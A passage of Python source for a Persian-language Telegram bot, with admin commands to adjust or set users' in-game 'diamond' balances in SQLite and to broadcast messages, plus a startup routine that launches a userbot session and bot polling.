    if not is_admin(m.from_user.id):
        return
    
    try:
        parts = m.text.split()
        target = int(parts[1])
        amount = int(parts[2])
        
        if is_owner(target):
            bot.reply_to(m, "❌ مالک بینهایت است!")
            return
        
        change_balance(target, -amount)
        bot.reply_to(m, f"✅ {amount} الماس از کاربر {target} کم شد!")
    except:
        bot.reply_to(m, "❌ فرمت: /remove <user_id> <amount>")

@bot.message_handler(commands=['setdiamonds'])
def set_diamonds(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        parts = m.text.split()
        target = int(parts[1])
        amount = int(parts[2])
        
        if is_owner(target):
            bot.reply_to(m, "❌ مالک بینهایت است!")
            return
        
        with db_lock, sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("UPDATE users SET diamonds=? WHERE user_id=?", (amount, target))
            conn.commit()
        
        bot.reply_to(m, f"✅ الماس کاربر {target} به {amount} تنظیم شد!")
    except:
        bot.reply_to(m, "❌ فرمت: /setdiamonds <user_id> <amount>")

@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if not is_admin(m.from_user.id):
        return
    
    message = m.text.replace('/broadcast', '').strip()
    if not message:
        bot.reply_to(m, "❌ لطفاً پیام رو وارد کن!")
        return
    
    bot.reply_to(m, "🔄 در حال ارسال...")
    
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM users")
        users = cur.fetchall()
    
    success = 0
    fail = 0
    
    for user in users:
        try:
            bot.send_message(user[0], f"📢 **پیام همگانی:**\n\n{message}", parse_mode="HTML")
            success += 1
            time.sleep(0.05)
        except:
            fail += 1
    
    bot.reply_to(m, f"✅ ارسال شد!\n✓ موفق: {success}\n✗ ناموفق: {fail}")

# ============================================================
# اجرا
# ============================================================

async def main():
    await client.start()
    print("✅ یوزربات با سشن لاگین شد!")
    
    init_db()
    
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("INSERT OR IGNORE INTO users(user_id,diamonds,created_at,is_self_active,self_active_time) VALUES(?,?,?,?,?)", 
                   (OWNER_ID, 0, int(time.time()), 0, 0))
        conn.commit()
    
    print("✅ ربات روشن شد!")
    print(f"💰 هزینه فعال‌سازی: {ACTIVATE_COST} الماس")
    print(f"⏱ هزینه ساعتی: {HOURLY_COST} الماس")
    
    bot.infinity_polling()

if __name__ == "__main__":
    asyncio.run(main())
